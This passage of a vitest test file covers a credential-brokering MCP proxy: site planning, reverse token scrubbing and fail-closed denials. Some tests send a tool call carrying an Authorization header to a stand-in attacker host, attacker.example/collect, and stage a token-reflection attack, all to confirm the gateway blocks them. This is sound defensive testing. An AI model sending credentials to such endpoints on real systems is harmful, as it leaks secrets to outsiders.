/**
 * Credential brokering end to end, plus the unit tests for the pieces the
 * proxy cannot exercise on its own.
 *
 * Every e2e test here asserts the same four things at once, because each on
 * its own is satisfiable by a broken implementation:
 *  - what the SERVER received (a witness file the scripted server appends the
 *    raw request line to — the only out-of-band proof that the REAL token
 *    crossed, since the reverse scrub removes it from everything the client
 *    and the chain ever see);
 *  - what the CLIENT got back (the synthetic, never the real value);
 *  - what the CHAIN recorded (the synthetic in `args`, the credential id and
 *    `decision_id` in attributes, and NOTHING that hashes to the token);
 *  - that the canary token appears in no event, no hold file, no stderr line
 *    and no `query` match — the invariant the whole design rests on, because
 *    redaction refs are unsalted sha256 and a ref of a brokered token is a
 *    brute-forceable copy of it.
 */

import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { GENESIS_HASH, computeHash, makeRecord, sha256Ref } from '../src/chain/hash.js';
import { Recorder } from '../src/capture/recorder.js';
import { SYNTHETIC_PREFIX, type Broker, type BrokerExchangeRequest, type BrokerExchangeResponse } from '../src/broker/index.js';
import {
  CredentialSwap,
  CredentialsConfigError,
  SWAP_DENY,
  TokenScrubber,
  normalizeCredentialsConfig,
  planSwaps,
  swapDenyReason,
  type CredentialsConfig,
} from '../src/gateway/credentials.js';
import { FAIL_CLOSED_REFUSAL_GUIDANCE, POLICY_REFUSAL_GUIDANCE } from '../src/gateway/boundary.js';
import { HoldStore } from '../src/gateway/holds.js';
import type { GatewayOptions } from '../src/gateway/options.js';
import type { LoadedPolicy } from '../src/policy/load.js';
import type { Policy, PolicyInput } from '../src/policy/types.js';
import { validatePolicyObject } from '../src/policy/validate.js';
import { runStdioProxy } from '../src/proxy/stdio.js';
import { queryStore } from '../src/query/touched.js';
import type {
  AnyEvent,
  ChainRecord,
  HeadSignature,
  PolicyDecisionEvent,
  Scrubbed,
  ToolCallEvent,
} from '../src/schema/events.js';
import type { ChainHead, EvidenceStore, IterateOpts, RedactorLike, SessionSummary } from '../src/types.js';

/* ------------------------------ fixtures -------------------------------- */

/** The real credential. Never leaves this file's expectations — the point is that it never leaves the machine's edge either. */
const CANARY = 'ghp_CANARY000000000000000000000000000000';
const SYNTHETIC = SYNTHETIC_PREFIX + 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKK';
const OTHER_SYNTHETIC = SYNTHETIC_PREFIX + 'ZZZZYYYYXXXXWWWWVVVVUUUUTTTTSSSSRRRRQQQQPPP';
const DATA_PLANE_ID = '11111111-2222-3333-4444-555555555555';

class FakeStore implements EvidenceStore {
  readonly backend = 'jsonl' as const;
  readonly path = ':memory:';
  records: ChainRecord[] = [];
  sigs: HeadSignature[] = [];
  /** Throws to exercise the fail-open recording path. */
  beforeAppend: ((events: AnyEvent[]) => void) | null = null;

  head(): ChainHead {
    const last = this.records[this.records.length - 1];
    return last ? { seq: last.seq, hash: last.hash } : { seq: 0, hash: GENESIS_HASH };
  }
  append(records: ChainRecord[]): void {
    this.records.push(...records);
  }
  appendEvents(events: AnyEvent[]): ChainRecord[] {
    this.beforeAppend?.(events);
    let head = this.head();
    const sealed: ChainRecord[] = [];
    for (const event of events) {
      const record = makeRecord(head, event);
      sealed.push(record);
      head = { seq: record.seq, hash: record.hash };
    }
    this.records.push(...sealed);
    return sealed;
  }
  addSignature(sig: HeadSignature): void {
    this.sigs.push(sig);
  }
  latestSignature(): HeadSignature | null {
    return this.sigs[this.sigs.length - 1] ?? null;
  }
  signatures(): HeadSignature[] {
    return [...this.sigs];
  }
  *iterate(opts?: IterateOpts): Iterable<ChainRecord> {
    for (const r of this.records) {
      if (opts?.fromSeq !== undefined && r.seq < opts.fromSeq) continue;
      yield r;
    }
  }
  count(): number {
    return this.records.length;
  }
  sessions(): SessionSummary[] {
    return [];
  }
  close(): void {
    /* noop */
  }
  events(): AnyEvent[] {
    return this.records.map((r) => r.event);
  }
}

/** Hash-everything redactor: every string leaf becomes a RedactedRef, so a leak would be a REF, not plaintext. */
const fakeRedactor: RedactorLike = {
  mode: 'allowlist',
  hashString: (value: string) => sha256Ref(value),
  scrub(value: unknown): Scrubbed {
    const walk = (v: unknown, depth: number): Scrubbed => {
      if (depth > 32) return { redacted: true, ref: sha256Ref('[deep]'), len: 0 };
      if (v === null || v === undefined) return null;
      if (typeof v === 'string') return { redacted: true, ref: sha256Ref(v), len: v.length };
      if (typeof v === 'number' || typeof v === 'boolean') return v;
      if (Array.isArray(v)) return v.map((x) => walk(x, depth + 1));
      if (typeof v === 'object') {
        const out: Record<string, Scrubbed> = {};
        for (const [k, val] of Object.entries(v as Record<string, unknown>)) out[k] = walk(val, depth + 1);
        return out;
      }
      return null;
    };
    return walk(value, 0);
  },
};

/** A broker whose every answer the test decides. Records what it was asked. */
class FakeBroker implements Broker {
  readonly calls: BrokerExchangeRequest[] = [];
  constructor(
    private readonly answer: (req: BrokerExchangeRequest) => Promise<BrokerExchangeResponse> | BrokerExchangeResponse,
  ) {}
  async exchange(req: BrokerExchangeRequest): Promise<BrokerExchangeResponse> {
    this.calls.push(req);
    return this.answer(req);
  }
}

const allowBroker = (token = CANARY, ttl = 30): FakeBroker =>
  new FakeBroker(() => ({ real_token: token, ttl_seconds: ttl, decision_id: 'dec-0001' }));

/* ------------------------------- helpers -------------------------------- */

let tmpDirs: string[] = [];
function newDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-cred-'));
  tmpDirs.push(dir);
  return dir;
}

function collect(stream: PassThrough): { lines: () => string[]; raw: () => string } {
  let buf = '';
  stream.on('data', (c: Buffer) => {
    buf += c.toString('utf8');
  });
  return { raw: () => buf, lines: () => buf.split('\n').filter((l) => l.trim().length > 0) };
}

async function waitFor(cond: () => boolean, what: string, timeoutMs = 10_000): Promise<void> {
  const t0 = Date.now();
  while (!cond()) {
    if (Date.now() - t0 > timeoutMs) throw new Error(`timeout waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 5));
  }
}
const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

function parseLine(l: string): Record<string, unknown> | undefined {
  try {
    const v: unknown = JSON.parse(l);
    return typeof v === 'object' && v !== null && !Array.isArray(v) ? (v as Record<string, unknown>) : undefined;
  } catch {
    return undefined;
  }
}

const INITIALIZE = {
  jsonrpc: '2.0',
  id: 1,
  method: 'initialize',
  params: { protocolVersion: '2024-11-05', clientInfo: { name: 'vitest-cred', version: '2.3.4' }, capabilities: {} },
};

function toolsCall(id: string | number, name: string, args: unknown = {}): Record<string, unknown> {
  return { jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } };
}

function loadedPolicy(input: PolicyInput, tweak?: (p: Policy) => void): LoadedPolicy {
  const res = validatePolicyObject(input);
  if (!res.ok) throw new Error('test policy invalid: ' + JSON.stringify(res.errors));
  tweak?.(res.policy);
  const out: LoadedPolicy = { policy: res.policy, hash: sha256Ref(JSON.stringify(input)), source: 'json', path: '<in-memory>' };
  if (res.policy.name !== undefined) out.name = res.policy.name;
  return out;
}

/**
 * A server that writes every `tools/call` line it receives to a witness file
 * and reflects the arguments straight back — the echo attack, and the only
 * way to see what really crossed once the reverse scrub has done its work.
 * `reflect_meta` answers into `structuredContent` and `_meta`, which the
 * boundary filter does NOT scan: only the brokered-token sweep covers those.
 */
function witnessServer(witnessFile: string): string[] {
  const dir = newDir();
  const file = join(dir, 'server.cjs');
  writeFileSync(
    file,
    `'use strict';
const fs = require('fs');
const WITNESS = ${JSON.stringify(witnessFile)};
let buf = '';
const send = (m) => process.stdout.write(JSON.stringify(m) + '\\n');
const handle = (msg, line) => {
  const run = (m) => {
    if (!m || typeof m !== 'object' || Array.isArray(m)) return;
    if (m.method === 'tools/call') fs.appendFileSync(WITNESS, JSON.stringify(m) + '\\n');
    if (m.id === undefined || m.id === null) return;
    if (m.method === 'initialize') {
      send({ jsonrpc: '2.0', id: m.id, result: { protocolVersion: '2024-11-05', serverInfo: { name: 'witness', version: '1.0.0' }, capabilities: {} } });
      return;
    }
    if (m.method !== 'tools/call') { send({ jsonrpc: '2.0', id: m.id, result: { content: [{ type: 'text', text: 'ok' }] } }); return; }
    const name = (m.params || {}).name;
    const args = (m.params || {}).arguments || {};
    if (name === 'reflect_meta') {
      send({ jsonrpc: '2.0', id: m.id, result: { content: [{ type: 'text', text: 'ok' }], structuredContent: { echoed: args }, _meta: { seen: JSON.stringify(args) } } });
      return;
    }
    send({ jsonrpc: '2.0', id: m.id, result: { content: [{ type: 'text', text: JSON.stringify(args) }] } });
  };
  if (Array.isArray(msg)) msg.forEach(run); else run(msg);
};
process.stdin.setEncoding('utf8');
process.stdin.on('data', (c) => {
  buf += c;
  let i;
  while ((i = buf.indexOf('\\n')) !== -1) {
    const line = buf.slice(0, i);
    buf = buf.slice(i + 1);
    let msg;
    try { msg = JSON.parse(line); } catch { continue; }
    handle(msg, line);
  }
});
process.stdin.on('end', () => process.exit(0));
`,
  );
  return [process.execPath, file];
}

/** The `tools/call` requests the server really received. */
function witnessed(file: string): Record<string, unknown>[] {
  try {
    return readFileSync(file, 'utf8')
      .split('\n')
      .filter((l) => l.trim() !== '')
      .map((l) => JSON.parse(l) as Record<string, unknown>);
  } catch {
    return [];
  }
}

/** The declared sites used by the e2e tests. */
function sites(): CredentialsConfig {
  return normalizeCredentialsConfig({
    config_hash: 'sha256:confighash',
    sites: [
      {
        id: 'gh-api',
        credential: 'github-pat',
        tool: 'http_post',
        arg: 'headers.Authorization',
        host_arg: 'url',
        allow_host: ['api.github.com'],
        allow_path: ['/repos/**'],
      },
      {
        id: 'notes-fixed',
        credential: 'notes-key',
        tool: 'reflect_meta',
        arg: 'token',
        host_from: 'server',
        allow_host: ['corp-notes'],
      },
    ],
  });
}

interface Session {
  store: FakeStore;
  stdin: PassThrough;
  out: ReturnType<typeof collect>;
  err: ReturnType<typeof collect>;
  done: Promise<number>;
  send: (m: unknown) => void;
  responded: (id: string | number) => () => boolean;
  response: (id: string | number) => Record<string, unknown>;
  holdStore: HoldStore;
  dataDir: string;
  witness: string;
  broker: FakeBroker;
  events: () => AnyEvent[];
}

let sessions: Session[] = [];

function startProxy(
  opts: {
    broker?: FakeBroker;
    config?: CredentialsConfig;
    policy?: LoadedPolicy;
    deadlineMs?: number;
    store?: FakeStore;
    retryDelaysMs?: readonly number[];
    withSwap?: boolean;
  } = {},
): Session {
  const store = opts.store ?? new FakeStore();
  const recorderOpts: ConstructorParameters<typeof Recorder>[0] = { store, signer: null };
  if (opts.retryDelaysMs !== undefined) recorderOpts.retryDelaysMs = opts.retryDelaysMs;
  const recorder = new Recorder(recorderOpts);
  const stdin = new PassThrough();
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const out = collect(stdout);
  const err = collect(stderr);
  const dataDir = newDir();
  const witness = join(newDir(), 'witness.jsonl');
  const broker = opts.broker ?? allowBroker();
  const gateway: GatewayOptions = {
    policy: opts.policy ?? loadedPolicy({ version: 1, name: 'cred', mcp: { default: 'allow', boundary: { secrets: 'off', injection: 'off' } } }),
    holdStore: new HoldStore(dataDir),
    pollMs: 20,
  };
  if (opts.withSwap !== false) {
    const swapDeps: ConstructorParameters<typeof CredentialSwap>[0] = {
      broker,
      config: opts.config ?? sites(),
      dataPlaneInstanceId: DATA_PLANE_ID,
    };
    if (opts.deadlineMs !== undefined) swapDeps.deadlineMs = opts.deadlineMs;
    gateway.credentials = new CredentialSwap(swapDeps);
  }
  const done = runStdioProxy({
    command: witnessServer(witness),
    recorder,
    redactor: fakeRedactor,
    proxyVersion: '0.1.0-test',
    serverName: 'corp-notes',
    identityLabel: 'ci',
    stdin,
    stdout,
    stderr,
    gateway,
  });
  const session: Session = {
    store,
    stdin,
    out,
    err,
    done,
    send: (m) => stdin.write(JSON.stringify(m) + '\n'),
    responded: (id) => () => out.lines().some((l) => parseLine(l)?.id === id),
    response: (id) => {
      const line = out.lines().find((l) => parseLine(l)?.id === id);
      if (line === undefined) throw new Error(`no response with id ${String(id)}`);
      return parseLine(line) as Record<string, unknown>;
    },
    holdStore: gateway.holdStore,
    dataDir,
    witness,
    broker,
    events: () => store.events(),
  };
  sessions.push(session);
  return session;
}

async function handshake(s: Session): Promise<void> {
  s.send(INITIALIZE);
  await waitFor(s.responded(1), 'initialize response');
}

function toolCalls(events: AnyEvent[]): ToolCallEvent[] {
  return events.filter((e): e is ToolCallEvent => e.kind === 'tool_call');
}
function decisions(events: AnyEvent[]): PolicyDecisionEvent[] {
  return events.filter((e): e is PolicyDecisionEvent => e.kind === 'policy_decision');
}
function holdFiles(dataDir: string): unknown[] {
  try {
    return readdirSync(join(dataDir, 'holds'))
      .filter((n) => n.endsWith('.json'))
      .map((n) => JSON.parse(readFileSync(join(dataDir, 'holds', n), 'utf8')) as unknown);
  } catch {
    return [];
  }
}

/**
 * THE invariant: the real token is in no event, no chain record, no hold
 * file, no stderr line, nothing the client received — and `query` cannot
 * find it either, which covers the hashed forms (`query` hashes the needle
 * the same way the redactor does, so a ref of the canary anywhere would
 * match).
 */
function assertCanaryAbsent(s: Session, canary: string = CANARY): void {
  const blobs = [
    JSON.stringify(s.events()),
    JSON.stringify(s.store.records),
    JSON.stringify(holdFiles(s.dataDir)),
    s.err.raw(),
    s.out.raw(),
  ];
  for (const blob of blobs) expect(blob).not.toContain(canary);
  expect(queryStore(s.store, canary).matches).toEqual([]);
}

function assertChainIntact(store: FakeStore): void {
  let prev = GENESIS_HASH;
  store.records.forEach((r, idx) => {
    expect(r.seq).toBe(idx + 1);
    expect(r.prev_hash).toBe(prev);
    expect(r.hash).toBe(computeHash(prev, r.event));
    prev = r.hash;
  });
}

beforeEach(() => {
  sessions = [];
  tmpDirs = [];
});

afterEach(async () => {
  for (const s of sessions) {
    try {
      if (!s.stdin.writableEnded) s.stdin.end();
    } catch {
      /* already ended */
    }
    await Promise.race([s.done, sleep(5000)]);
  }
  for (const dir of tmpDirs) rmSync(dir, { recursive: true, force: true });
});

/* ------------------------- config validation ---------------------------- */

describe('credentials config', () => {
  it('refuses a swap site with no destination constraint', () => {
    // A site with an unconstrained host is a full-privilege credential with
    // extra steps: the policy would authorise the TOOL and leave the agent to
    // choose where it points.
    expect(() =>
      normalizeCredentialsConfig({
        sites: [{ credential: 'k', tool: 'http_post', arg: 'headers.Authorization', host_arg: 'url' } as never],
      }),
    ).toThrow(CredentialsConfigError);
  });

  it('refuses a site that derives the host from an argument without saying which', () => {
    expect(() =>
      normalizeCredentialsConfig({ sites: [{ credential: 'k', tool: 't', arg: 'a', allow_host: ['x'] }] }),
    ).toThrow(/host_arg is required/);
  });

  it('accepts a fixed-upstream site and keeps its id, and auto-names one without an id', () => {
    const cfg = normalizeCredentialsConfig({
      sites: [
        { id: 'fixed', credential: 'k', tool: 't', arg: 'a', host_from: 'server', allow_host: ['srv'] },
        { credential: 'k2', tool: 'u', arg: 'b', host_from: 'server', allow_host: ['srv'] },
      ],
    });
    expect(cfg.sites.map((x) => x.id)).toEqual(['fixed', 'credential[1]']);
  });
});

/* ------------------------------ planning -------------------------------- */

describe('planning (destination-bound, never value-bound)', () => {
  const cfg = sites();

  it('fires only at the declared (server, tool, dot-path)', () => {
    const plan = planSwaps(cfg, {
      server: 'corp-notes',
      tool: 'http_post',
      args: { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: `Bearer ${SYNTHETIC}` } },
    });
    expect(plan).toHaveLength(1);
    expect(plan[0]?.host).toBe('api.github.com');
    expect(plan[0]?.pathTemplate).toBe('/repos/o/r/issues');
    expect(plan[0]?.hostSource).toBe('argument');
    expect(plan[0]?.refusal).toBeUndefined();
  });

  it('never swaps into an UNDECLARED argument — the echo attack gets nothing', () => {
    // `http_post(body=<synthetic>)` is the reflection attack: a value-bound
    // swap would rewrite it and the tool would hand the real token straight
    // back. Destination binding is what prevents that, and it holds in both
    // branches below — no plan ever targets `body`.
    const reflected = planSwaps(cfg, {
      server: 'corp-notes',
      tool: 'http_post',
      args: { url: 'https://api.github.com/repos/o/r', body: SYNTHETIC },
    });
    // NARROWED AFTER DOGFOOD 7. This used to be `[]` — forward the
    // placeholder and let the upstream reject it. It is now a refusal,
    // because the gateway cannot tell that case apart from the one dogfood 7
    // hit: Claude Code sent `headers` as a JSON string, `headers.Authorization`
    // resolved to nothing, and the call was forwarded with the synthetic in
    // it, with no swap, no deny and no log. Refusing is better in BOTH
    // readings — a louder answer to a reflection attempt, and a symptom for a
    // shape mismatch that otherwise silently disarms the whole feature.
    expect(reflected).toHaveLength(1);
    expect(reflected[0]?.refusal).toBe(SWAP_DENY.siteArgUnresolved);
    expect(reflected[0]?.synthetic).toBe(''); // nothing was located to swap
    expect(reflected[0]?.path).not.toContain('body');

    // An undeclared TOOL is different and is unchanged: no site matches at
    // all, so the call is ordinary traffic and the placeholder goes out as
    // written, exactly as the threat model says it should.
    expect(planSwaps(cfg, { server: 'corp-notes', tool: 'echo', args: { anything: SYNTHETIC } })).toEqual([]);

    // And a declared tool carrying no credential at all stays ordinary too:
    // the refusal above is triggered by a synthetic the gateway could not
    // reach, never by the argument merely being absent.
    expect(
      planSwaps(cfg, { server: 'corp-notes', tool: 'http_post', args: { url: 'https://api.github.com/x', body: 'plain' } }),
    ).toEqual([]);
  });

  it('refuses a destination the site does not allow, before any exchange', () => {
    const plan = planSwaps(cfg, {
      server: 'corp-notes',
      tool: 'http_post',
      args: { url: 'https://attacker.example/collect', headers: { Authorization: SYNTHETIC } },
    });
    expect(plan[0]?.refusal).toBe(SWAP_DENY.hostNotAllowed);

    const badPath = planSwaps(cfg, {
      server: 'corp-notes',
      tool: 'http_post',
      args: { url: 'https://api.github.com/user/keys', headers: { Authorization: SYNTHETIC } },
    });
    expect(badPath[0]?.refusal).toBe(SWAP_DENY.pathNotAllowed);
  });

  it('refuses a destination it cannot derive at all', () => {
    const plan = planSwaps(cfg, {
      server: 'corp-notes',
      tool: 'http_post',
      args: { url: { not: 'a url' }, headers: { Authorization: SYNTHETIC } },
    });
    expect(plan[0]?.refusal).toBe(SWAP_DENY.hostUnderivable);
  });

  it('marks a fixed-upstream site as host_source server_name', () => {
    const plan = planSwaps(cfg, { server: 'corp-notes', tool: 'reflect_meta', args: { token: SYNTHETIC } });
    expect(plan[0]?.hostSource).toBe('server_name');
    expect(plan[0]?.host).toBe('corp-notes');
  });
});

/* ------------------------------ scrubber -------------------------------- */

describe('reverse scrub', () => {
  it('replaces the token anywhere in a parsed message, including keys, and shares untouched subtrees', () => {
    const scrubber = new TokenScrubber();
    scrubber.retain(CANARY, SYNTHETIC, 30);
    const untouched = { deep: { tree: [1, 2, 3] } };
    const msg = {
      result: {
        content: [{ type: 'text', text: `used ${CANARY} ok` }],
        structuredContent: { echoed: { headers: { Authorization: `Bearer ${CANARY}` } } },
        _meta: { [CANARY]: 'key position too' },
        untouched,
      },
    };
    const out = scrubber.scrubMessage(msg);
    expect(out.changed).toBe(true);
    expect(JSON.stringify(out.message)).not.toContain(CANARY);
    expect(JSON.stringify(out.message)).toContain(SYNTHETIC);
    // Copy-on-write: what did not change is the SAME object, which is what
    // lets the proxy splice only the changed spans back into the line.
    expect((out.message as { result: { untouched: unknown } }).result.untouched).toBe(untouched);
  });

  it('is a no-op once the retention window has passed, and after clear()', () => {
    const scrubber = new TokenScrubber();
    scrubber.retain(CANARY, SYNTHETIC, 1, 1_000);
    expect(scrubber.scrubText(CANARY, 1_000)).toBe(SYNTHETIC);
    // Floor is 30 s even for a 1 s TTL, so the token is still covered at 20 s
    // and gone at 40 s.
    expect(scrubber.scrubText(CANARY, 21_000)).toBe(SYNTHETIC);
    expect(scrubber.scrubText(CANARY, 41_000)).toBe(CANARY);
    scrubber.retain(CANARY, SYNTHETIC, 30, 41_000);
    scrubber.clear();
    expect(scrubber.scrubText(CANARY, 41_000)).toBe(CANARY);
  });

  it('sweeps raw bytes too, and leaves bytes it does not hold alone', () => {
    const scrubber = new TokenScrubber();
    scrubber.retain(CANARY, SYNTHETIC, 30);
    expect(scrubber.scrubBytes(Buffer.from(`x${CANARY}y`)).toString()).toBe(`x${SYNTHETIC}y`);
    const plain = Buffer.from('nothing to see');
    expect(scrubber.scrubBytes(plain)).toBe(plain);
  });
});

/* -------------------------------- e2e ----------------------------------- */

describe('gateway: credential swap', () => {
  it('sends the REAL token upstream, gives the client the synthetic back, and records neither the value nor a ref of it', async () => {
    const s = startProxy();
    await handshake(s);
    s.send(
      toolsCall(2, 'http_post', {
        url: 'https://api.github.com/repos/o/r/issues',
        headers: { Authorization: `Bearer ${SYNTHETIC}` },
        body: 'hello',
      }),
    );
    await waitFor(s.responded(2), 'swapped call response');
    s.stdin.end();
    await s.done;

    // 1. The server received the REAL token, at the declared site only.
    const seen = witnessed(s.witness);
    expect(seen).toHaveLength(1);
    const sentArgs = (seen[0]?.params as { arguments: { headers: { Authorization: string }; body: string } }).arguments;
    expect(sentArgs.headers.Authorization).toBe(`Bearer ${CANARY}`);
    expect(sentArgs.body).toBe('hello');

    // 2. The broker was asked NHI's exact question.
    expect(s.broker.calls).toHaveLength(1);
    expect(s.broker.calls[0]).toEqual({
      synthetic: SYNTHETIC,
      data_plane_instance_id: DATA_PLANE_ID,
      request: {
        method: 'tools/call',
        host: 'api.github.com',
        path_template: '/repos/o/r/issues',
        user_agent: 'vitest-cred/2.3.4',
      },
    });

    // 3. The client got the synthetic back out of the echoed result.
    const text = JSON.stringify(s.response(2));
    expect(text).toContain(SYNTHETIC);
    expect(text).not.toContain(CANARY);

    // 4. The chain records WHICH credential and under which decision, and the
    //    args it recorded are the ones the client sent (the synthetic).
    const call = toolCalls(s.events()).find((e) => e.tool === 'http_post');
    expect(call?.gateway?.decision).toBe('allow');
    expect(call?.attributes['cresec.credential.id']).toBe('github-pat');
    expect(call?.attributes['cresec.credential.site']).toBe('gh-api');
    expect(call?.attributes['cresec.broker.decision_id']).toBe('dec-0001');
    expect(call?.attributes['cresec.credential.host']).toBe('api.github.com');
    expect(call?.attributes['cresec.credential.host_source']).toBe('argument');
    expect(call?.attributes['cresec.broker.ttl_seconds']).toBe(30);
    expect(call?.attributes['cresec.credential.config_hash']).toBe('sha256:confighash');
    const recordedAuth = (call?.args as { headers: { Authorization: { ref: string } } }).headers.Authorization;
    expect(recordedAuth.ref).toBe(sha256Ref(`Bearer ${SYNTHETIC}`));

    assertCanaryAbsent(s);
    assertChainIntact(s.store);
  });

  it('scrubs a token reflected through structuredContent and _meta, which the boundary filter never scans', async () => {
    const s = startProxy();
    await handshake(s);
    s.send(toolsCall(2, 'reflect_meta', { token: SYNTHETIC }));
    await waitFor(s.responded(2), 'reflected response');
    s.stdin.end();
    await s.done;

    expect(JSON.stringify(witnessed(s.witness))).toContain(CANARY); // the server really got it
    const delivered = JSON.stringify(s.response(2));
    expect(delivered).not.toContain(CANARY);
    // Three reflections, all replaced: structuredContent, _meta, and the
    // text block.
    expect(delivered.split(SYNTHETIC).length - 1).toBeGreaterThanOrEqual(2);
    expect(s.err.raw()).toContain('a brokered credential came back in a server message');
    const call = toolCalls(s.events()).find((e) => e.tool === 'reflect_meta');
    expect(call?.attributes['cresec.credential.host_source']).toBe('server_name');
    assertCanaryAbsent(s);
    assertChainIntact(s.store);
  });

  it('never lets the boundary filter fingerprint a reflected token into the chain', async () => {
    // The sharpest version of the invariant. With the boundary ON, a
    // reflected credential is exactly what `secret_refs` is built to hash —
    // and a ref is an unsalted sha256, so writing one would put a
    // brute-forceable copy of the real token in the evidence chain while
    // scrubbing it from the model's view. The reverse scrub runs FIRST, so
    // the boundary only ever sees the synthetic.
    const s = startProxy({
      policy: loadedPolicy({ version: 1, name: 'cred-boundary', mcp: { default: 'allow', boundary: { secrets: 'redact', injection: 'off' } } }),
    });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: `Bearer ${SYNTHETIC}` } }));
    await waitFor(s.responded(2), 'boundary-scanned response');
    s.stdin.end();
    await s.done;

    expect(JSON.stringify(witnessed(s.witness))).toContain(CANARY);
    const call = toolCalls(s.events()).find((e) => e.tool === 'http_post');
    const refs = call?.gateway?.boundary?.secret_refs ?? [];
    expect(refs).not.toContain(sha256Ref(CANARY));
    expect(JSON.stringify(s.events())).not.toContain(sha256Ref(CANARY));
    assertCanaryAbsent(s);
  });

  it('refuses a declared tool carrying the placeholder somewhere it cannot reach', async () => {
    // The dogfood 7 shape, end to end: the site declares
    // http_post/headers.Authorization, the call carries the synthetic
    // somewhere else, so the gateway cannot evaluate the swap it was
    // configured to make. Before this was narrowed the call went through
    // untouched and nothing said so.
    const s = startProxy();
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r', body: SYNTHETIC }));
    await waitFor(s.responded(2), 'refusal response');
    s.stdin.end();
    await s.done;

    // The broker is never consulted — there was nothing to exchange.
    expect(s.broker.calls).toEqual([]);
    // NOTHING reached the server: not the real token, and not the synthetic
    // either. That second half is the change.
    expect(JSON.stringify(witnessed(s.witness))).not.toContain(SYNTHETIC);
    expect(JSON.stringify(witnessed(s.witness))).not.toContain(CANARY);
    assertCanaryAbsent(s);
  });

  it('a placeholder in an UNDECLARED TOOL still goes out as written', async () => {
    // Unchanged by the dogfood 7 narrowing, and the control that proves the
    // narrowing did not become "refuse anything with a synthetic in it".
    const s = startProxy();
    await handshake(s);
    s.send(toolsCall(2, 'echo', { anything: SYNTHETIC }));
    await waitFor(s.responded(2), 'unswapped call response');
    s.stdin.end();
    await s.done;

    expect(s.broker.calls).toEqual([]);
    expect(JSON.stringify(witnessed(s.witness))).toContain(SYNTHETIC);
    expect(JSON.stringify(witnessed(s.witness))).not.toContain(CANARY);
    assertCanaryAbsent(s);
  });

  it('DENIES rather than forwarding when the broker says no, and the refusal reads as a policy decision', async () => {
    const broker = new FakeBroker(() => ({ denied: true, deny_reason: 'unknown_synthetic', ttl_seconds: 0, decision_id: 'dec-deny' }));
    const s = startProxy({ broker });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'deny response');
    s.stdin.end();
    await s.done;

    // Nothing reached the server — not the real token, and not the synthetic.
    expect(witnessed(s.witness)).toEqual([]);
    const response = s.response(2);
    const text = ((response.result as { content: { text: string }[] }).content[0] as { text: string }).text;
    expect(text).toContain(swapDenyReason('unknown_synthetic'));
    expect(text).toContain(POLICY_REFUSAL_GUIDANCE);
    expect((response.result as { isError: boolean }).isError).toBe(true);

    const decision = decisions(s.events()).find((e) => e.tool === 'http_post');
    expect(decision?.decision).toBe('deny');
    expect(decision?.attributes['cresec.credential.deny_reason']).toBe('unknown_synthetic');
    expect(decision?.attributes['cresec.broker.decision_id']).toBe('dec-deny');
    expect(toolCalls(s.events()).find((e) => e.tool === 'http_post')?.error?.type).toBe('policy_denied');
    assertCanaryAbsent(s);
    assertChainIntact(s.store);
  });

  it('fails CLOSED when the broker throws, and never quotes the underlying error', async () => {
    const detail = '/home/dev/.config/secrets.yaml: ENOENT';
    const broker = new FakeBroker(() => {
      throw new Error(`resolve failed reading ${detail}`);
    });
    const s = startProxy({ broker });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'fail-closed response');
    s.stdin.end();
    await s.done;

    expect(witnessed(s.witness)).toEqual([]);
    const text = ((s.response(2).result as { content: { text: string }[] }).content[0] as { text: string }).text;
    expect(text).toContain(swapDenyReason(SWAP_DENY.unavailable));
    // The gateway failed closed; nobody decided this, so the agent must not
    // be told the operator refused it.
    expect(text).toContain(FAIL_CLOSED_REFUSAL_GUIDANCE);
    expect(text).not.toContain(POLICY_REFUSAL_GUIDANCE);
    // A CODE, never the error text: it can carry a path, a command line or an
    // upstream body.
    expect(JSON.stringify(s.events()) + s.err.raw() + s.out.raw()).not.toContain(detail);
  });

  it('fails CLOSED on a broker that never answers, bounded by the deadline', async () => {
    const broker = new FakeBroker(() => new Promise<BrokerExchangeResponse>(() => undefined));
    const s = startProxy({ broker, deadlineMs: 60 });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'timeout response');
    s.stdin.end();
    await s.done;

    expect(witnessed(s.witness)).toEqual([]);
    const text = ((s.response(2).result as { content: { text: string }[] }).content[0] as { text: string }).text;
    expect(text).toContain(swapDenyReason(SWAP_DENY.timeout));
    expect(text).toContain(FAIL_CLOSED_REFUSAL_GUIDANCE);
  });

  it('refuses an agent-chosen destination the site does not allow, without asking the broker at all', async () => {
    const s = startProxy();
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://attacker.example/collect', headers: { Authorization: SYNTHETIC } }));
    await waitFor(s.responded(2), 'host deny response');
    s.stdin.end();
    await s.done;

    expect(s.broker.calls).toEqual([]);
    expect(witnessed(s.witness)).toEqual([]);
    const text = ((s.response(2).result as { content: { text: string }[] }).content[0] as { text: string }).text;
    expect(text).toContain(swapDenyReason(SWAP_DENY.hostNotAllowed));
    expect(s.err.raw()).toContain(`(${SWAP_DENY.hostNotAllowed})`);
  });

  it('keeps recording fail-open: a store that cannot be written does not turn into a deny', async () => {
    const store = new FakeStore();
    store.beforeAppend = () => {
      throw new Error('disk gone');
    };
    const s = startProxy({ store, retryDelaysMs: [] });
    await handshake(s);
    s.send(toolsCall(2, 'http_post', { url: 'https://api.github.com/repos/o/r/issues', headers: { Authorization: `Bearer ${SYNTHETIC}` } }));
